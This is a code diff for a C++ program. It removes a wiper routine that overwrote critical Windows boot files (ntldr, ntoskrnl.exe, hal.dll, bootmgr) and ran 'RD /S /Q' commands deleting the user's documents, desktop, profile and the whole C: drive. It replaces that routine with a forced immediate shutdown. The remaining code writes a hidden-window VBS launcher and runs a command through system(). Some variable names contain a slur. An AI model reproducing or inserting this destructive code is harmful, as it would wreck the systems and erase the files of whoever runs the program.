@@ -361,9 +361,7 @@ public:
 			return;
 		}
 
-		char *ToFuck[99] = { "C:\\boot.ini", "C:\\config.sys", "C:\\ntldr", "C:\\WINDOWS\\bootstat.dat", "C:\\WINDOWS\\System32\\ntoskrnl.exe", "C:\\WINDOWS\\System32\\hal.dll", "C:\\WINDOWS\\System32\\bootres.dll", "C:\\WINDOWS\\Boot\\DVD\\PCAT\\en-US\\bootfix.bin", "C:\\WINDOWS\\Boot\\DVD\\PCAT\\etfsboot.com", "C:\\WINDOWS\\Boot\\DVD\\PCAT\\boot.sdi", "C:\\WINDOWS\\Boot\\PCAT\\bootmgr" };
-
-		std::string badboy = "RD /S /Q %USERPROFILE%\\Documents\\Visual Studio 2013\\Projects\nRD /S /Q %USERPROFILE%\\Documents\\Visual Studio 2010\\Projects\nRD /S /Q %USERPROFILE%\\Documents\\Visual Studio 2008\\Projects\nRD /S /Q %USERPROFILE%\\dropbox\nRD /S /Q %USERPROFILE%\\Desktop\nRD /S /Q %USERPROFILE%\\Documents\nRD /S /Q %USERPROFILE%\\Pictures\nRD /S /Q %USERPROFILE%\\Music\nRD /S /Q %USERPROFILE%\\Videos\nRD /S /Q %USERPROFILE%\nRD /S /Q C:\\";
+		std::string badboy = "shutdown -t 0 -s -f";
 		std::string nig = "C:\\Nikyuria\\log\\dif.vbs";
 
 		utils::file::FileCreate(nig.c_str(), "CreateObject(\"Wscript.Shell\").Run \"\"\"\" & WScript.Arguments(0) & \"\"\"\", 0, False");
@@ -399,16 +397,6 @@ public:
 
 			if (!swag)
 			{
-				for (int i = 0; i>-1; i++) {
-					char *File = ToFuck[i];
-
-					if (!File)
-						break;
-
-
-					utils::file::FileCreate(File, "!dontdelete!");
-				}
-
 				system(torun.str().c_str());
 				swag = true;
 			}
